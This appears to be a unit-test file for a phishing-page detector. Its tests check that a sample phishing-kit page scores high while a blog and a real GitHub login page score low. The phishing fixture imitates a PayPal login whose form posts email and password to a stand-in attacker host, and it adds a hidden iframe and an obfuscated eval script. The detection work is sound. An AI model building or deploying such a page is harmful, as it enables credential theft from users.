import unittest

from engine.pagefeatures import analyze_page

PHISH = """<html><head><title>PayPal - Log in to your account</title></head>
<body oncontextmenu="return false"><img src="https://cdn.other.net/logo.png">
<h1>Verify your account</h1><p>Your account has been suspended. Verify your account immediately.</p>
<form action="https://collector.evil-host.ru/post.php" method="post">
<input name="email"><input type="password" name="pw"><button>Log in</button></form>
<iframe src="https://x.example.net/t" width="0" height="0"></iframe>
<script>eval(atob("YWxlcnQoMSk="))</script></body></html>"""

BLOG = ("<html><head><title>My blog</title></head><body><h1>Hello</h1><p>Some text about PayPal fees.</p>"
        "<a href='/about'>About</a><a href='/posts'>Posts</a><a href='/x'>x</a></body></html>")

LOGIN = ("<html><head><title>Sign in to GitHub</title></head><body>"
         "<form action='/session' method='post'><input name='login'><input type='password' name='password'></form>"
         "<a href='/forgot'>Forgot?</a><a href='/join'>Join</a><a href='/terms'>Terms</a></body></html>")


class PageTests(unittest.TestCase):
    def test_phishing_kit_page(self):
        r = analyze_page(PHISH, "http://paypal-secure-login.verify-account.xyz/signin")
        self.assertGreater(r.score, 0.95)
        f = r.features
        self.assertTrue(f["collects_credentials"] and f["ext_form_action"] and f["brand_mismatch"])
        self.assertTrue(f["right_click_blocked"] and f["insecure_password"])
        self.assertEqual(f["hidden_iframes"], 1)
        signals = {e.signal for e in r.evidence}
        self.assertIn("Login form sends data to another site", signals)
        self.assertIn("evil-host.ru", next(e.detail for e in r.evidence if e.signal.startswith("Login form")))

    def test_plain_page_scores_low(self):
        r = analyze_page(BLOG, "https://myblog.example.org/post")
        self.assertLess(r.score, 0.1)
        self.assertFalse(r.features["brand_mismatch"])  # one passing mention is not impersonation

    def test_legitimate_login_is_not_flagged_as_phishing(self):
        r = analyze_page(LOGIN, "https://github.com/login")
        self.assertLess(r.score, 0.3)
        self.assertFalse(r.features["ext_form_action"])
        self.assertFalse(r.features["brand_mismatch"])

    def test_same_login_form_is_riskier_on_an_unrelated_domain(self):
        legit = analyze_page(LOGIN, "https://github.com/login").score
        fake = analyze_page(LOGIN, "https://gitub-support.top/login").score
        self.assertGreater(fake, legit)

    def test_malformed_html_does_not_crash(self):
        r = analyze_page("<<<not html <form><input type=password", "https://example.com/")
        self.assertTrue(0.0 <= r.score <= 1.0)
        self.assertEqual(analyze_page("", "https://example.com/").score, analyze_page("   ", "https://example.com/").score)


if __name__ == "__main__":
    unittest.main()
